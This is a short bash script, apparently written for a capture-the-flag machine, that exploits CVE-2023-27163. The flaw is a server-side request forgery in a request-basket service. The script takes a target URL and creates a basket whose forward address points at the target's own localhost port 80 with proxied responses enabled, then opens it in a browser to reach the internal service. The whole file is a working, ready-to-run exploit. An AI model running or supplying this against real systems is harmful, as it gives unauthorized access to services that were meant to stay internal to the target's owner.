#!/bin/bash

############################################################
Help()
{
   # Display Help
   echo "-u     URL"
   echo "Syntax: CVE-2023-27163.sh -u <url>"
   echo "ex:  ./CVE-2023-27163.sh -u http://10.10.11.224:55555"
}

############################################################
# Process the input options. Add options as needed.        #
############################################################
# Get the options
while getopts "u:h" option; do
   case $option in
   	h) # display Help
	    Help
        exit;;
    u) # URL
		URL=${OPTARG};;
   esac
done

############################################################
# If no options are passed do the following        		   #
############################################################

if [ $# -eq 0 ]; then
    >&2 echo -e "$YELLOW" "No arguments provided"
    >&2 echo -e "$GREEN" "Use -h for help"
    exit 1
fi

echo "Atteming SSRF against ${URL}"
curl --location "${URL}/api/baskets/carrot" --header 'Content-Type: application/json' --data '{"forward_url": "http://127.0.0.1:80/", "proxy_response": true, "insecure_tls": false, "expand_path": true, "capacity": 250}'
firefox "${URL}/carrot"
